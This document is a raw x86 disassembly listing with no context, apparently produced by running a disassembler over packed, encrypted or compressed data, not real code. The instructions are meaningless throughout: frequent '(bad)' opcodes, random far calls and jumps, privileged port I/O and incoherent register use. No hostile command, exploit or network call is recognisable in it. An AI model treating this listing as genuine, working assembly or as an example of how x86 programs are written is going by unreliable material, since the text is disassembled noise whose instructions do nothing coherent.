  4294f3:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  4294f7:	sub    al,0x53
  4294f9:	ds jg  0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp+0x1a3aadea],dx
  429503:	cld    
  429504:	ins    BYTE PTR es:[edi],dx
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	inc    edx
  42950d:	sub    al,0xa6
  42950f:	pop    ebp
  429510:	stc    
  429511:	jecxz  0x429590
  429513:	out    dx,eax
  429514:	shr    BYTE PTR [edi-0x1d1185b],cl
  42951a:	mov    ebx,0xbcf5b0fb
  42951f:	dec    edi
  429520:	test   al,0xd6
  429522:	jbe    0x429519
  429524:	or     DWORD PTR [ebp+0x4a],ebx
  429527:	pop    edi
  429528:	or     BYTE PTR [edx],ah
  42952a:	ds scas eax,DWORD PTR es:[edi]
  42952c:	pop    ebx
  42952d:	aaa    
  42952e:	outs   dx,BYTE PTR ds:[esi]
  42952f:	jl     0x429542
  429531:	add    eax,0xd256040
  429536:	out    dx,al
  429537:	loopne 0x42956e
  429539:	jbe    0x4294c9
  42953b:	or     ecx,DWORD PTR [ecx]
  42953d:	icebp  
  42953e:	(bad)  
  429540:	adc    BYTE PTR [edi+esi*8-0x6d],dl
  429544:	push   ecx
  429545:	mov    ds:0x70ffea3d,al
  42954a:	dec    BYTE PTR [ebx]
  42954c:	int    0x79
  42954e:	xchg   edx,eax
  42954f:	xlat   BYTE PTR ds:[ebx]
  429550:	jmp    0xa14a4a96
  429555:	aam    0xc6
  429557:	pop    edx
  429558:	jb     0x4295cd
  42955a:	sbb    esi,ecx
  42955c:	cmp    ebx,DWORD PTR [edi]
  42955e:	jnp    0x4295aa
  429560:	ins    DWORD PTR es:[edi],dx
  429561:	mov    al,ds:0x370a4add
  429566:	jnp    0x4295be
  429568:	mov    dl,0x49
  42956a:	test   edi,ecx
  42956c:	mov    edx,0xbe74696
  429571:	and    ebp,esi
  429573:	jbe    0x429551
  429575:	xor    DWORD PTR ds:0x39c7cb00,ebx
  42957b:	lds    eax,FWORD PTR [esi]
  42957d:	add    eax,0x7a524573
  429582:	bound  esi,QWORD PTR [ebx]
  429584:	and    BYTE PTR [esi-0x3e738d88],0x44
  42958b:	(bad)  [ebx-0x27ffc48a]
  429591:	ja     0x4295ed
  429593:	neg    DWORD PTR ds:0xa895f742
  429599:	xchg   bl,ah
  42959b:	rol    DWORD PTR ds:0x5c7a4d8d,cl
  4295a1:	stos   BYTE PTR es:[edi],al
  4295a2:	dec    esi
  4295a3:	repz fisubr DWORD PTR [ecx+0x4f91e8ab]
  4295aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295ab:	or     BYTE PTR [eax+0x5ffa49d5],ah
  4295b1:	push   ecx
  4295b2:	daa    
  4295b3:	paddq  mm6,mm6
  4295b6:	inc    ebp
  4295b7:	push   cs
  4295b8:	mov    ds:0xeb205971,eax
  4295bd:	sbb    esi,DWORD PTR [eax+0x73f8fca1]
  4295c3:	inc    edi
  4295c4:	es mov ebx,0x3fb2282
  4295ca:	mov    bh,0xec
  4295cc:	sar    BYTE PTR [ecx+0x12],1
  4295cf:	pop    edi
  4295d0:	lds    esi,FWORD PTR [esi-0x7a]
  4295d3:	and    bl,BYTE PTR [eax+ecx*1]
  4295d6:	mov    ch,0x50
  4295d8:	mov    ds:0x243e9916,eax
  4295dd:	adc    ebp,DWORD PTR [esi-0x4ff37f3b]
  4295e3:	ret    
  4295e4:	push   ebx
  4295e5:	std    
  4295e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4295e7:	pop    esp
  4295e8:	enter  0x188e,0x1
  4295ec:	fld    QWORD PTR [ecx]
  4295ee:	lods   eax,DWORD PTR ds:[esi]
  4295ef:	(bad)  
  4295f0:	jl     0x429588
  4295f2:	pushf  
  4295f3:	sar    DWORD PTR [ebx+0x3b],1
  4295f6:	mov    ebx,0xb7266a69
  4295fb:	retf   
  4295fc:	sbb    ah,ah
  4295fe:	jbe    0x4295ac
  429600:	aam    0xc9
  429602:	and    dl,BYTE PTR [ecx]
  429604:	out    dx,al
  429605:	dec    ebp
  429606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429607:	dec    edi
  429608:	lea    edi,[ecx]
  42960a:	fldcw  WORD PTR [edx+0x67b7db6d]
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	jae    0x42961f
  429682:	lahf   
  429683:	xchg   esi,eax
  429684:	jo     0x429640
  429686:	add    DWORD PTR [eax],eax
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	add    eax,0xcefbc84a
  429691:	out    0x47,al
  429693:	and    eax,0xa7177c8d
  429698:	stos   DWORD PTR es:[edi],eax
  429699:	dec    eax
  42969a:	xor    al,0xef
  42969c:	out    0x38,al
  42969e:	jb     0x4296fd
  4296a0:	or     eax,0x52e58b22
  4296a5:	ficomp DWORD PTR [edx-0x7db3096b]
  4296ab:	or     al,al
  4296ad:	jp     0x429703
  4296af:	xor    eax,0x1c1d124e
  4296b4:	fs mov ch,0xbb
  4296b7:	call   0x12d765ab
  4296bc:	or     ecx,DWORD PTR [ecx+ebp*8]
  4296bf:	or     eax,0xa9f626dd
  4296c4:	mov    ds:0x965c7593,al
  4296c9:	add    BYTE PTR [edi],0x6f
  4296cc:	lea    eax,[ebx+0x5be6dfe6]
  4296d2:	adc    ebp,ebx
  4296d4:	retf   0xdfd5
  4296d7:	in     al,0x91
  4296d9:	xor    al,0x4d
  4296db:	lock out dx,al
  4296dd:	dec    ecx
  4296de:	idiv   DWORD PTR [esi+0x40938007]
  4296e4:	shr    dl,cl
  4296e6:	call   0x5ddc440f
  4296eb:	adc    eax,0x8467edae
  4296f0:	jle    0x4296a7
  4296f2:	in     eax,0x86
  4296f4:	mov    ah,0x4c
  4296f6:	push   esi
  4296f7:	bnd jg 0x429699
  4296fa:	adc    eax,0x2b3f5d9d
  4296ff:	inc    edi
  429700:	jecxz  0x429745
  429702:	lea    ebp,[ecx-0x2694beb5]
  429708:	push   0x1bfc11b1
  42970d:	leave  
  42970e:	ds push cs
  429710:	push   eax
  429711:	cmp    edi,esp
  429713:	cmp    ah,dh
  429715:	adc    al,0xe8
  429717:	jecxz  0x4296b7
  429719:	add    eax,0xc7c02ed7
  42971e:	adc    al,0x63
  429720:	sar    BYTE PTR [edi-0x561afec],0xa5
  429727:	scas   eax,DWORD PTR es:[edi]
  429728:	fnstcw WORD PTR [ebp+ebx*4+0x51]
  42972c:	mov    dh,0x4e
  42972e:	or     ebx,edx
  429730:	leave  
  429731:	push   esi
  429732:	inc    esp
  429733:	mov    bh,0x9e
  429735:	add    bp,di
  429738:	or     al,0x5f
  42973a:	and    al,0x64
  42973c:	cmp    dh,cl
  42973e:	push   es
  42973f:	inc    ebx
  429740:	(bad)  
  429741:	shl    BYTE PTR ds:0x80e02bff,0x84
  429748:	cmp    eax,0x9b6db4d2
  42974d:	push   ebx
  42974e:	shr    BYTE PTR [ebx+0x3c],cl
  429751:	xor    ch,BYTE PTR [edx+0x62c990e4]
  429757:	sub    BYTE PTR [esi],cl
  429759:	shr    BYTE PTR [edx+0x7037eedf],cl
  42975f:	inc    edi
  429760:	pop    ecx
  429761:	inc    ecx
  429762:	mov    bh,0xd9
  429764:	mov    bh,0x1f
  429766:	add    eax,0x5967d838
  42976b:	add    eax,0x22b54379
  429770:	neg    esi
  429772:	add    DWORD PTR [edi+edx*8-0x540b615e],edx
  429779:	sub    bl,ah
  42977b:	dec    edx
  42977c:	pop    ecx
  42977d:	mov    WORD PTR [ebx-0x5106fb00],ds
  429783:	dec    esi
  429784:	xor    dh,ch
  429786:	push   edx
  429787:	lds    eax,FWORD PTR [edx+eax*8-0x55]
  42978b:	jnp    0x429711
  42978d:	dec    edi
  42978e:	and    dh,BYTE PTR [edx+0x0]
	...
  4297f4:	xor    BYTE PTR [edx-0x21],al
  4297f7:	(bad)  
  4297f8:	(bad)  
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	push   edi
  429801:	int3   
  429802:	and    BYTE PTR [esi],bl
  429804:	je     0x4297c1
  429806:	add    DWORD PTR [eax],eax
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	jl     0x4297a4
  42980e:	adc    eax,esi
  429810:	fistp  WORD PTR [esi-0x38]
  429813:	xchg   BYTE PTR [edi-0x45],bl
  429816:	mov    esi,edi
  429818:	push   ebx
  429819:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42981a:	dec    edx
  42981b:	mov    ch,0x68
  42981d:	fcom   DWORD PTR [ecx+0x5b]
  429820:	adc    al,0xaf
  429822:	jo     0x429895
  429824:	rol    DWORD PTR [ebx],cl
  429826:	pop    ds
  429827:	and    esi,eax
  429829:	ficom  DWORD PTR [ebx+ebp*4+0x6d51933e]
  429830:	fadd   QWORD PTR [ebx]
  429832:	xchg   edx,eax
  429833:	cmp    al,0x70
  429835:	pop    esi
  429836:	int3   
  429837:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429838:	jns    0x4297da
  42983a:	retf   0xa5ab
  42983d:	mov    ebx,0xb7d47239
  429842:	ss aas 
  429844:	push   edx
  429845:	lods   al,BYTE PTR ds:[esi]
  429846:	and    esp,eax
  429848:	test   al,0x51
  42984a:	push   ebx
  42984b:	sbb    BYTE PTR [ebx+0x35],cl
  42984e:	rep stos DWORD PTR es:[edi],eax
  429850:	add    esp,0xffffffff
  429853:	pusha  
  429854:	pop    ds
  429855:	int3   
  429856:	xchg   BYTE PTR [ebx-0x53],bl
  429859:	cmp    BYTE PTR [eax],dl
  42985b:	ins    BYTE PTR es:[edi],dx
  42985c:	in     eax,dx
  42985d:	mov    cl,0xe4
  42985f:	ins    BYTE PTR es:[edi],dx
  429860:	cmp    eax,0xa50b3da0
  429865:	mov    eax,ds:0xd19665fb
  42986a:	cld    
  42986b:	sbb    eax,0xa506cf5d
  429870:	xchg   ecx,eax
  429871:	jno    0x429860
  429873:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429874:	loop   0x4298d1
  429876:	(bad)
  429879:	mov    dh,0xe1
  42987b:	mov    eax,ds:0xa6e07025
  429880:	dec    esi
  429881:	fwait
  429882:	repnz bound edx,QWORD PTR [edi-0x66]
  429886:	ret    0x3193
  429889:	inc    ebp
  42988a:	push   esp
  42988b:	adc    al,0xbc
  42988d:	inc    esp
  42988e:	fdivr  st,st(1)
  429890:	fist   DWORD PTR [edx]
  429892:	sbb    BYTE PTR [ecx-0xf],dl
  429895:	inc    ebx
  429896:	inc    eax
  429897:	jle    0x42986f
  429899:	cmc    
  42989a:	mov    esi,0x6f63b772
  42989f:	icebp  
  4298a0:	nop
  4298a1:	push   0x5a
  4298a3:	push   esp
  4298a4:	sti    
  4298a5:	xor    al,0xb6
  4298a7:	jb     0x4298a2
  4298a9:	jbe    0x429854
  4298ab:	dec    edx
  4298ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298ad:	iret   
  4298ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4298af:	inc    eax
  4298b0:	sti    
  4298b1:	shl    BYTE PTR [esi],1
  4298b3:	pop    edi
  4298b4:	ja     0x4298c9
  4298b6:	mov    ds:0x3ee3d032,eax
  4298bb:	lahf   
  4298bc:	pop    ecx
  4298bd:	cli    
  4298be:	mov    edi,gs
  4298c0:	lods   eax,DWORD PTR ds:[esi]
  4298c1:	icebp  
  4298c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298c3:	ror    BYTE PTR [ebx-0x73],0x30
  4298c7:	mov    al,ds:0x80fd2f0e
  4298cc:	push   ebx
  4298cd:	pop    esi
  4298ce:	mov    dh,0xf9
  4298d0:	pushf  
  4298d1:	mov    ecx,0x61367af0
  4298d6:	and    esp,DWORD PTR [ebx-0x23]
  4298d9:	cmovp  ebx,edi
  4298dc:	clc    
  4298dd:	and    esi,DWORD PTR [ecx-0x47]
  4298e0:	push   es
  4298e1:	(bad)  
  4298e2:	jp     0x42990e
  4298e4:	sub    dh,bh
  4298e6:	cmc    
  4298e7:	adc    cl,0x64
  4298ea:	mov    eax,ds:0x9a397de5
  4298ef:	or     DWORD PTR [edx+eiz*2+0x1fb849a4],esi
  4298f6:	and    esi,ebp
  4298f8:	retf   0x7b83
  4298fb:	aad    0x9d
  4298fd:	mov    esi,0x23b98859
  429902:	inc    esp
  429903:	inc    eax
  429904:	pop    esp
  429905:	out    0xb9,al
  429907:	mov    ch,0x44
  429909:	jmp    DWORD PTR [edx]
  42990b:	gs dec ecx
  42990d:	push   esi
  42990e:	int3   
  42990f:	aaa    
	...
  429974:	push   edi
  429975:	push   0xdf7fdf64
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	mov    esp,0x785a99d9
  429985:	mov    esp,0x1040001
  42998a:	add    BYTE PTR [eax],al
  42998c:	pushf  
  42998d:	in     eax,0xd3
  42998f:	inc    esi
  429990:	out    0x41,eax
  429992:	iret   
  429993:	jp     0x429948
  429995:	add    BYTE PTR [ebp-0x1d],bh
  429998:	sbb    al,BYTE PTR [edi]
  42999a:	in     eax,0x32
  42999c:	lods   al,BYTE PTR ds:[esi]
  42999d:	and    ebx,DWORD PTR [ebx-0x5c76197b]
  4299a3:	stos   DWORD PTR es:[edi],eax
  4299a4:	adc    dl,BYTE PTR [esi]
  4299a6:	push   es
  4299a7:	jnp    0x4299f0
  4299a9:	sar    DWORD PTR [eax-0x7260e2c6],1
  4299af:	and    ah,BYTE PTR [eax+0x75f1d5ea]
  4299b5:	nop
  4299b6:	mov    ebx,0xc0b9760b
  4299bb:	fwait
  4299bc:	inc    edi
  4299bd:	mov    ecx,edx
  4299bf:	(bad)  
  4299c1:	bound  esi,QWORD PTR [ebx]
  4299c3:	lea    ecx,[edi+0x5b0f3eb]
  4299c9:	outs   dx,DWORD PTR ds:[esi]
  4299ca:	sub    BYTE PTR [esi-0x6e365ef3],al
  4299d0:	inc    eax
  4299d1:	or     DWORD PTR [ecx+0x416f5226],esi
  4299d7:	add    al,0x66
  4299d9:	lods   eax,DWORD PTR ds:[esi]
  4299da:	xchg   BYTE PTR [esp+ebp*4-0x171739b2],ch
  4299e1:	mov    al,ds:0xba15a4f4
  4299e6:	in     eax,dx
  4299e7:	inc    esi
  4299e8:	push   cs
  4299e9:	mov    di,0xe7c5
  4299ed:	adc    DWORD PTR [eax+0x485fadb4],ebp
  4299f3:	xor    eax,0x47a739dc
  4299f8:	push   edx
  4299f9:	(bad)  
  4299fb:	xchg   edi,eax
  4299fc:	mov    eax,0x33a9ecf3
  429a01:	push   0xcf0a88cf
  429a06:	popa   
  429a07:	mov    gs,WORD PTR [ecx+0x64c694d6]
  429a0d:	or     al,0xef
  429a0f:	loopne 0x4299f4
  429a11:	jmp    0x4299a5
  429a13:	scas   eax,DWORD PTR es:[edi]
  429a14:	inc    ebp
  429a15:	mov    ecx,0xca7d910
  429a1a:	mov    al,ds:0xde7308e3
  429a1f:	(bad)  
  429a20:	leave  
  429a21:	xchg   ebx,eax
  429a22:	lock add eax,ecx
  429a25:	mov    cl,0x6a
  429a27:	mov    ch,0x41
  429a29:	cmp    al,0xad
  429a2b:	cs (bad) 
  429a2d:	test   DWORD PTR [eax+0x4457a40b],0x63223ff4
  429a37:	push   eax
  429a38:	cmp    BYTE PTR ds:0x5320d281,al
  429a3e:	push   ecx
  429a3f:	cmc    
  429a40:	inc    edx
  429a41:	fcmovnu st,st(7)
  429a43:	mov    bl,0xa4
  429a45:	inc    ebx
  429a46:	shl    edx,cl
  429a48:	sbb    edi,esi
  429a4a:	and    eax,0x6c930b41
  429a4f:	loop   0x429a21
  429a51:	imul   BYTE PTR ds:0xc27d839d
  429a57:	out    0x4d,eax
  429a59:	mov    ch,0xe8
  429a5b:	mov    edx,DWORD PTR [esi-0x3c5663b2]
  429a61:	into   
  429a62:	push   edi
  429a63:	jmp    0x7304e415
  429a68:	int3   
  429a69:	loop   0x429abf
  429a6b:	mov    ch,0x90
  429a6d:	mov    WORD PTR [edx],es
  429a6f:	push   eax
  429a70:	push   ebp
  429a71:	pop    esp
  429a72:	jmp    0x429a85
  429a74:	mov    bh,0xd4
  429a76:	and    DWORD PTR [ecx+edx*8],ecx
  429a79:	aas    
  429a7a:	add    DWORD PTR [esi+0x2d092cdd],ebx
  429a80:	pop    es
  429a81:	mov    ch,BYTE PTR [edi-0x2a6adea8]
  429a87:	out    0x2c,al
  429a89:	out    0x83,eax
  429a8b:	xchg   eax,edx
  429a8d:	xchg   ebx,eax
  429a8e:	jmp    0x429b75
	...
  429af3:	add    dh,cl
  429af5:	std    
  429af6:	sti    
  429af7:	leave  
  429af8:	sti    
  429af9:	iret   
  429afa:	(bad)  
  429afb:	jmp    DWORD PTR ds:0x41a95667
  429b01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b02:	retf   
  429b03:	ret    0xbd7c
  429b06:	add    DWORD PTR [eax],eax
  429b08:	add    al,0x1
  429b0a:	add    BYTE PTR [eax],al
  429b0c:	shl    ebx,cl
  429b0e:	mov    al,ds:0xe25818da
  429b13:	mov    ch,BYTE PTR [ebx+ebx*1+0x2bb2e8c8]
  429b1a:	add    al,0xe0
  429b1c:	mov    ds:0x22bcc2a5,al
  429b21:	icebp  
  429b22:	pop    esp
  429b23:	sbb    BYTE PTR [ebp+0x4ad9d931],dh
  429b29:	out    dx,eax
  429b2a:	mov    eax,ds:0xc8719a0a
  429b2f:	sbb    ch,BYTE PTR [ebx-0x48ba2936]
  429b35:	mov    edx,0x6c606d02
  429b3a:	xor    al,0x80
  429b3c:	jle    0x429abe
  429b3e:	cmp    al,0x4f
  429b40:	dec    esp
  429b41:	mov    ebp,0x1f16c206
  429b46:	sub    DWORD PTR [edx-0x7759f222],ecx
  429b4c:	jmp    0x429b81
  429b4e:	jl     0x429b4d
  429b50:	mov    WORD PTR [edx+0x45],?
  429b53:	fs scas eax,DWORD PTR es:[edi]
  429b55:	cdq    
  429b56:	jno    0x429b08
  429b58:	fstp   DWORD PTR [esi-0x47]
  429b5b:	push   0xccfc0dfe
  429b60:	call   0x933a23bc
  429b65:	neg    al
  429b67:	pop    edi
  429b68:	sbb    BYTE PTR [esi-0x16],bh
  429b6b:	sub    BYTE PTR [ebx+0x2183b770],cl
  429b71:	jbe    0x429bc0
  429b73:	mov    cs,WORD PTR [edx-0xf56aa8f]
  429b79:	and    DWORD PTR [edx],ebx
  429b7b:	movlhps xmm4,xmm5
  429b7e:	idiv   BYTE PTR [edx+0xf]
  429b81:	fcom   DWORD PTR [ebx+0x2d427943]
  429b87:	dec    esp
  429b88:	sbb    ecx,DWORD PTR [edi-0x2a]
  429b8b:	mov    ecx,0x91c90078
  429b90:	jne    0x429ba7
  429b92:	jle    0x429b93
  429b94:	add    BYTE PTR [esi+0x7ce18019],ah
  429b9a:	push   0xaa341309
  429b9f:	out    0xfd,eax
  429ba1:	or     bl,bl
  429ba3:	xchg   BYTE PTR [ebp+0x6d],bl
  429ba6:	cld    
  429ba7:	mov    edi,0x4d33b38c
  429bac:	xchg   esp,eax
  429bad:	mov    bh,0x5
  429baf:	outs   dx,DWORD PTR ds:[esi]
  429bb0:	repz cmp al,0xd2
  429bb3:	pop    ebp
  429bb4:	jp     0x429b39
  429bb6:	out    dx,eax
  429bb7:	inc    BYTE PTR [eax+0x67]
  429bba:	iret   
  429bbb:	push   eax
  429bbc:	call   FWORD PTR [ecx-0x50]
  429bbf:	addps  xmm2,XMMWORD PTR [edi+0x15]
  429bc3:	icebp  
  429bc4:	(bad)  
  429bc5:	aad    0xe8
  429bc7:	dec    esp
  429bc8:	(bad)  [ecx+0x4]
  429bcb:	or     eax,0xcca46d8a
  429bd0:	sub    eax,0x8d168e94
  429bd5:	retf   
  429bd6:	bound  edi,QWORD PTR [ebx+0x21]
  429bd9:	xor    ebp,esp
  429bdb:	pop    esi
  429bdc:	or     DWORD PTR [ebx],edi
  429bde:	fld    QWORD PTR [ecx-0x4a2b7441]
  429be4:	aad    0x49
  429be6:	jle    0x429b9b
  429be8:	dec    edx
  429be9:	sar    bh,1
  429beb:	lods   eax,DWORD PTR ds:[esi]
  429bec:	retf   
  429bed:	inc    ebp
  429bee:	push   esp
  429bef:	int    0xbe
  429bf1:	cld    
  429bf2:	test   eax,0x7a7214b8
  429bf7:	fistp  WORD PTR [eax-0x44a8412c]
  429bfd:	inc    esi
  429bfe:	jo     0x429c32
  429c00:	mov    edx,DWORD PTR [ebp-0x32]
  429c03:	mov    dh,0x93
  429c05:	xor    eax,0xf77f9ef2
  429c0a:	pop    ebp
  429c0b:	mov    al,ds:0xcc56dd83
	...
  429c74:	mov    ds:0xb788a616,eax
  429c79:	mov    eax,0x89413faf
  429c7e:	(bad)  
  429c7f:	xor    BYTE PTR [ebx-0x2],bh
  429c82:	dec    ebp
  429c83:	push   edi
  429c84:	cmp    BYTE PTR [esi+0x1040001],0x0
  429c8b:	add    ch,dh
  429c8d:	popf   
  429c8e:	out    dx,al
  429c8f:	sub    al,0x28
  429c91:	xchg   esp,eax
  429c92:	or     BYTE PTR [edi],bl
  429c94:	mov    BYTE PTR [edx-0xb],dh
  429c97:	and    DWORD PTR ds:[ebx+eax*2-0x24],0x1
  429c9d:	and    DWORD PTR [edi+0x293497bb],0x143977f2
  429ca7:	(bad)  
  429ca8:	loop   0x429c55
  429caa:	jge    0x429c93
  429cac:	aam    0x1a
  429cae:	sub    dh,bh
  429cb0:	adc    al,0xfe
  429cb2:	test   al,0x3a
  429cb4:	mov    eax,ds:0xf128d152
  429cb9:	sub    ebp,DWORD PTR [edx+0x76]
  429cbc:	jb     0x429c6f
  429cbe:	pusha  
  429cbf:	push   0xca4101dc
  429cc4:	inc    ebp
  429cc5:	push   esp
  429cc6:	add    dh,bl
  429cc8:	sbb    DWORD PTR [edx+ebx*4],ebp
  429ccb:	imul   eax,DWORD PTR [edx-0x7832091f],0x13ae7f4c
  429cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429cd6:	adc    BYTE PTR [edi],cl
  429cd8:	pop    es
  429cd9:	dec    edi
  429cda:	fbld   TBYTE PTR [eax+0x22]
  429cdd:	push   0xd4360d64
  429ce2:	stos   BYTE PTR es:[edi],al
  429ce3:	add    DWORD PTR [edi+0x36a43fea],ebx
  429ce9:	enter  0xf9ae,0x88
  429ced:	or     dl,BYTE PTR [ebx-0x79b8a50f]
  429cf3:	add    bl,BYTE PTR [edi]
  429cf5:	inc    ecx
  429cf6:	std    
  429cf7:	xor    BYTE PTR [eax+0x49a5aa3],bh
  429cfd:	jmp    0x310a:0x46986edf
  429d04:	jl     0x429d0b
  429d06:	jp     0x429cb8
  429d08:	pop    eax
  429d09:	dec    edi
  429d0a:	push   es
  429d0b:	jmp    0x90a:0x73361f10
  429d12:	scas   eax,DWORD PTR es:[edi]
  429d13:	xor    al,0x19
  429d15:	iret   
  429d16:	call   0x80beb7a2
  429d1b:	test   BYTE PTR [ebx-0x6d],bl
  429d1e:	es ja  0x429d43
  429d21:	lahf   
  429d22:	pop    ecx
  429d23:	fcmovnu st,st(1)
  429d25:	mov    esp,0xb0427b75
  429d2a:	ins    DWORD PTR es:[edi],dx
  429d2b:	add    DWORD PTR [ebp-0x1b],0x8dc3c3dc
  429d32:	push   cs
  429d33:	add    ch,BYTE PTR ds:0xb13fe258
  429d39:	lods   eax,DWORD PTR ds:[esi]
  429d3a:	pop    ss
  429d3b:	cdq    
  429d3c:	sub    DWORD PTR [esi+0x5b0e1beb],edi
  429d42:	mov    ah,0x3d
  429d44:	arpl   WORD PTR [edi+0x38552277],dx
  429d4a:	jmp    0xd0288ce8
  429d4f:	adc    DWORD PTR [ebp+0xaca0af2],esp
  429d55:	dec    edi
  429d56:	mov    ebp,0xae93699b
  429d5b:	repnz retf 
  429d5d:	inc    edi
  429d5e:	mov    ch,0xa
  429d60:	sar    BYTE PTR [edi],1
  429d62:	lods   eax,DWORD PTR ds:[esi]
  429d63:	fdiv   st(5),st
  429d65:	test   ebx,eax
  429d67:	lds    edx,FWORD PTR [eax]
  429d69:	(bad)  [esi-0x7755b5ae]
  429d6f:	inc    DWORD PTR [ebx+edi*8+0x77]
  429d73:	outs   dx,BYTE PTR ds:[esi]
  429d74:	cmp    edx,DWORD PTR [eax+0x30]
  429d77:	in     eax,0x40
  429d79:	repz xchg ecx,eax
  429d7b:	cmp    al,0x1b
  429d7d:	mov    ebp,es
  429d7f:	mov    al,0x3d
  429d81:	jle    0x429dca
  429d83:	jmp    0x429dce
  429d85:	xchg   ebp,eax
  429d86:	dec    esp
  429d87:	jl     0x429df7
  429d89:	jg     0x429d6e
  429d8b:	into   
  429d8c:	ret    0x2090
  429d8f:	inc    edx
	...
  429df4:	fwait
  429df5:	mov    bh,0xc4
  429df7:	or     al,0xec
  429df9:	jg     0x429dd6
  429dfb:	mov    bh,0xe1
  429dfd:	sahf   
  429dfe:	loop   0x429e68
  429e00:	adc    BYTE PTR [edi+0x45],ah
  429e03:	call   0x104:0x1bf84
  429e0a:	add    BYTE PTR [eax],al
  429e0c:	mov    ecx,0xdc10eb0c
  429e11:	and    al,0x4d
  429e13:	loop   0x429e70
  429e15:	adc    DWORD PTR [ebx+eax*4-0x45a8baf6],0x6e
  429e1d:	push   ecx
  429e1e:	add    BYTE PTR [edx-0x43],al
  429e21:	adc    eax,0x6065b4c3
  429e26:	add    BYTE PTR [eax+0x36578066],bl
  429e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429e2d:	or     DWORD PTR [ecx+0x6f],esp
  429e30:	and    bl,dl
  429e32:	mul    ebx
  429e34:	xchg   ebp,eax
  429e35:	arpl   bx,sp
  429e37:	test   al,0x31
  429e39:	inc    ebx
  429e3a:	aad    0x99
  429e3c:	outs   dx,DWORD PTR ds:[esi]
  429e3d:	jb     0x429e71
  429e3f:	pop    ebp
  429e40:	cli    
  429e41:	call   0x747c:0x4564adf9
  429e48:	lods   al,BYTE PTR ds:[esi]
  429e49:	cmc    
  429e4a:	mov    edx,fs
  429e4c:	inc    esp
  429e4d:	push   es
  429e4e:	rcl    dh,cl
  429e50:	xlat   BYTE PTR ds:[ebx]
  429e51:	sub    ah,BYTE PTR [edi+0x31]
  429e54:	push   ecx
  429e55:	push   ds
  429e56:	mov    bl,0x10
  429e58:	loop   0x429e1b
  429e5a:	mov    esi,0xa110e7d8
  429e5f:	mov    cl,0xec
  429e61:	fwait
  429e62:	les    esi,FWORD PTR [eax]
  429e64:	cli    
  429e65:	mov    DWORD PTR [eax+0x3e],ebx
  429e68:	jo     0x429e79
  429e6a:	push   eax
  429e6b:	into   
  429e6c:	jno    0x429e5d
  429e6e:	cmc    
  429e6f:	sub    DWORD PTR [ebx],ecx
  429e71:	mov    al,0xf4
  429e73:	fisttp DWORD PTR [eax]
  429e76:	popa   
  429e77:	mov    ds:0xa0261497,al
  429e7c:	test   al,0x3c
  429e7e:	dec    edi
  429e7f:	dec    ebp
  429e80:	sbb    al,BYTE PTR [ecx]
  429e82:	mov    cl,0xec
  429e84:	inc    edx
  429e85:	push   ss
  429e86:	std    
  429e87:	or     esi,ecx
  429e89:	stc    
  429e8a:	scas   eax,DWORD PTR es:[edi]
  429e8b:	adc    esi,esi
  429e8d:	stos   BYTE PTR es:[edi],al
  429e8e:	mov    dl,0x63
  429e90:	add    BYTE PTR [edx+edi*1],ah
  429e93:	fs push edx
  429e95:	push   ss
  429e96:	(bad)  
  429e97:	sub    DWORD PTR [eax-0x7657d3b1],eax
  429e9d:	and    edx,eax
  429e9f:	shr    DWORD PTR [esp+eiz*8-0x29],1
  429ea3:	clc    
  429ea4:	(bad)  
  429ea5:	sbb    ch,cl
  429ea7:	xchg   BYTE PTR [eax+0x263eb6b9],al
  429ead:	xchg   ebp,eax
  429eae:	ror    DWORD PTR [ebx-0x15],cl
  429eb1:	out    dx,al
  429eb2:	hlt    
  429eb3:	std    
  429eb4:	push   edi
  429eb5:	hlt    
  429eb6:	cmp    eax,0x704f85c5
  429ebb:	jecxz  0x429e3f
  429ebd:	cmc    
  429ebe:	ret    0xc161
  429ec1:	mul    BYTE PTR [eax+0x27]
  429ec4:	add    edi,DWORD PTR [esi]
  429ec6:	out    0x8d,eax
  429ec8:	push   esi
  429ec9:	in     al,0xbc
  429ecb:	cli    
  429ecc:	and    dh,BYTE PTR [eax]
  429ece:	and    BYTE PTR [ecx+0x559cd346],ch
  429ed4:	sbb    BYTE PTR [ebx-0x5449491f],dl
  429eda:	(bad)  
  429edb:	dec    edi
  429edc:	or     esp,DWORD PTR [ebp+0x47]
  429edf:	inc    edi
  429ee0:	jne    0x429ead
  429ee2:	xor    ah,BYTE PTR [ebp+0x7c]
  429ee5:	inc    esp
  429ee7:	jae    0x429f27
  429ee9:	inc    edx
  429eea:	pop    es
  429eeb:	in     eax,dx
  429eec:	div    BYTE PTR [eax+0x54d3de5f]
  429ef2:	test   al,0xb8
  429ef4:	add    DWORD PTR [ecx],edi
  429ef6:	iret   
  429ef7:	call   0x5dde:0xa1c7122e
  429efe:	lds    edi,FWORD PTR [eax-0x77]
  429f01:	(bad)  
  429f02:	mov    bh,0xaf
  429f04:	rcr    BYTE PTR [edi+0x6dcae3af],cl
  429f0a:	hlt    
  429f0b:	xor    al,0x15
  429f0d:	fmulp  st(2),st
  429f0f:	adc    al,BYTE PTR [eax]
	...
  429f71:	add    BYTE PTR [eax],al
